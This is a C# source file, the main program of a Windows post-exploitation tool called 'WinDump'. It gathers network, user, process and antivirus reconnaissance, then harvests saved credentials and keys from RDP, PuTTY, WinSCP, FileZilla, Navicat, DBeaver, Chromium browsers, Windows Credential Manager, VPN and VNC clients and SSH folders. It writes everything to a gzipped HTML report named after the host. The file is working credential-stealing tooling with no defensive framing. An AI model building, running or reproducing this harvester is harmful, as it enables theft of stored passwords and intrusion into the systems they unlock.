using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Text;

namespace WinDump
{
    internal class Program
    {
        static void Main(string[] args)
        {
            try
            {
                DoMain();
            }
            catch (Exception ex)
            {
                File.WriteAllText(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "error.log"), ex.ToString());
                Environment.Exit(1);
            }
        }
        static void DoMain()
        {
            var title = "windump";
            DataTable navicatkey = null;
            DataTable navicat = null;
            try
            {
                title = Interface.GetIP() + "_" + Environment.MachineName;
                navicat = Navicat.GetNavicat(out navicatkey);
            }
            catch { }
            Dictionary<string, string> values = new Dictionary<string, string>
            {
                {"{title}",  title},
                // Network
                {"{interface}", Utils.TryToHTML(Interface.GetInterface)},
                {"{route}", Utils.TryToHTML(Routing.GetRoute)},
                {"{tcp}", Utils.TryToHTML(Netstat.GetTCP)},
                {"{udp}", Utils.TryToHTML(Netstat.GetUDP)},
                {"{dns}", Utils.TryToHTML(DNSCache.GetDNSCache)},
                {"{wifi}", Utils.TryToHTML(WIFI.GetWIFI)},

                // User
                {"{user}", Utils.TryToHTML(User.GetUser)},
                {"{quser}", Utils.TryToHTML(QUser.GetQUser)},

                // Process
                {"{process}", Utils.TryToHTML(Process.GetProcess)},
                {"{service}", Utils.TryToHTML(Process.GetService)},
                {"{av}", Utils.TryToHTML(Process.GetAV)},

                // Files
                {"{hosts}", Files.Hosts()},
                {"{iis}", Files.IIS()},
                {"{powershell}", Files.Powershell()},

                // Directories
                {"{programs}", Utils.TryToHTML(Directories.Programs)},
                {"{recent}", Utils.TryToHTML(Directories.Recent)},
                {"{explorer}", Utils.TryToHTML(Directories.ExplorerHistory)},
                {"{desktop}", Utils.TryToHTML(Directories.Desktop)},
                {"{documents}", Utils.TryToHTML(Directories.Documents)},
                {"{ssh}", Utils.TryToHTML(Directories.SSH)},

                // Cred
                {"{rdp}", Utils.TryToHTML(RDP.GetRDP)},
                {"{putty}", Utils.TryToHTML(Putty.GetPutty)},
                {"{filezilla}", Utils.TryToHTML(FileZilla.GetFileZilla)},
                {"{xmanager_session}", Utils.TryToHTML(XManager.GetSession)},
                {"{xmanager_key}", Utils.TryToHTML(XManager.GetUserKey)},
                {"{winscp}", Utils.TryToHTML(WinSCP.GetWinSCP)},
                {"{finalshell}", Utils.TryToHTML(FinalShell.GetFinalShell)},
                {"{finalshellkey}", Utils.TryToHTML(FinalShell.GetFinalShellKey)},
                {"{securecrt}", Utils.TryToHTML(SecureCRT.GetSecureCRT)},
                {"{navicat}", Utils.ToHTML(navicat)},
                {"{navicatkey}", Utils.ToHTML(navicatkey)},
                {"{dbeaver}", DBeaver.GetDBeaver()},
                {"{browser}", Utils.TryToHTML(BrowserChromiumBased.GetChromiumBased)},
                {"{credential}", Utils.TryToHTML(Credential.GetCred)},
                {"{openvpn}", Utils.TryToHTML(OpenVPN.GetOpenVPN)},
                {"{tightvnc}", Utils.TryToHTML(TightVNC.GetTightVNC)},
                {"{ultravnc}", Utils.TryToHTML(UltraVNC.GetUltraVNC)},

                // System
                {"{systeminfo}",  Utils.TryToHTML(SystemInfo.GetInfo)},
                {"{drive}", Utils.TryToHTML(SystemInfo.GetDrive)},
                {"{product}", Utils.TryToHTML(SystemInfo.GetInstalledApp)},
            };
            var output = new MemoryStream();
            using (var ms = new MemoryStream(Resource.index))
            using (var gz = new GZipStream(ms, CompressionMode.Decompress))
            {
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = gz.Read(buffer, 0, buffer.Length)) > 0)
                {
                    output.Write(buffer, 0, bytesRead);
                }
            }
            var sb = new StringBuilder(Encoding.UTF8.GetString(output.ToArray()));
            foreach (KeyValuePair<string, string> item in values)
            {
                sb.Replace(item.Key, item.Value);
            }
            var data = Encoding.UTF8.GetBytes(sb.ToString());
            var filename = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, title + ".html.gz");
            using (var fs = new FileStream(filename, FileMode.Create, FileAccess.Write, FileShare.None))
            using (var gz = new GZipStream(fs, CompressionMode.Compress))
            {
                gz.Write(data, 0, data.Length);
            }
            Environment.Exit(0);

        }


    }
}
